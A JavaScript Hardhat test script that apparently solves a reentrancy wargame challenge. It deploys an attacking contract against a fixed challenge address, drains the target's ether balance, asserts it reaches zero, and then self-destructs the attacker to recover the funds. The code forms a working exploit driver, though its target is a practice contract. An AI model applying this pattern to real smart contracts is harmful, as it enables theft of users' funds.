const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0xaf26E02c2087C02f6ae3F8c01C91459e17314585";
describe("Reentrancy", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Reentrance");
    contract = factory.attach(CHALLENGE_ADDRESS);
  });

  it("initiates hack", async () => {
    console.log("initiating hack!");
    console.log("getting balance of contract");
    const contractBalance = await ethers.provider.getBalance(CHALLENGE_ADDRESS);
    console.log("balance of contract:", contractBalance);
    console.log("deploying attacking contract");
    const reentranceFactory = await ethers.getContractFactory("HackReentrancy");
    reentrace = await reentranceFactory.deploy(CHALLENGE_ADDRESS, {
      value: 100000000000000,
      gasLimit: 3e6,
    });
    await reentrace.deployed();
    console.log("reentrance deployed");
    const reentranceBalance = await contract.balanceOf(reentrace.address);
    console.log("balance of hacking contract in reentrance", reentranceBalance);
    console.log("initiating reentrancy hack");
    const tx1 = await reentrace.attack({ value: reentranceBalance });
    await tx1.wait();
    const contractBalanceNow = await ethers.provider.getBalance(
      CHALLENGE_ADDRESS
    );
    console.log("balance of contract:", contractBalanceNow);
    expect(contractBalanceNow).to.eq(0);
    console.log("killing attack contract to get back funds");
    console.log(
      "My balance before:",
      await ethers.provider.getBalance(deployer.address)
    );
    const tx2 = await reentrace.kill();
    await tx2.wait();
    console.log(
      "My balance after:",
      await ethers.provider.getBalance(deployer.address)
    );
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
